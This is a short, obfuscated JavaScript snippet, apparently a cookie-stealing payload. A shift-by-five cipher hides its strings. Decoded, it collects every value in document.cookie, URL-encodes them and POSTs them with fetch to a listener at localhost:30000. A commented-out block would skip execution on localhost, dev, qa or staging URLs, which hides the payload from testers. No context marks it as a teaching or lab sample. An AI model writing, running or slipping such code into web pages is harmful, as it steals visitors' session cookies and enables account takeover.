(() => {
  // let t = false;
  // ['localhost', 'dev', 'qa', 'staging'].forEach(s => {
  //   if (new RegExp(s).test(location.href)) {
  //     t = true;
  //     return;
  //   }
  // });
  // if (t) return;

  const c = str => str
    .split('')
    .map(s => String.fromCharCode(s.charCodeAt() - 5))
    .join('');

  const k = (o) => Object
    .keys(o)
    .map((k) => encodeURIComponent(k) + '=' + encodeURIComponent(o[k]))
    .join('&');

  const r = () => {
    let a = {}
    let b = document[c('httpnj')].split('; ')
    b.forEach(e => {
      const d = e.split('=')
      a[d[0]] = d[1]
    })
    return k(a)
  }

  window[c('kjyhm')](c('myyu?44qthfqmtxy?85554'), {
    [c('rjymti')]: c('utxy'),
    [c('mjfijwx')]: {[c('Htsyjsy2Y~uj')]: c('fuuqnhfynts4}2|||2ktwr2zwqjshtiji')},
    [c('gti~')]: r()
  })
})()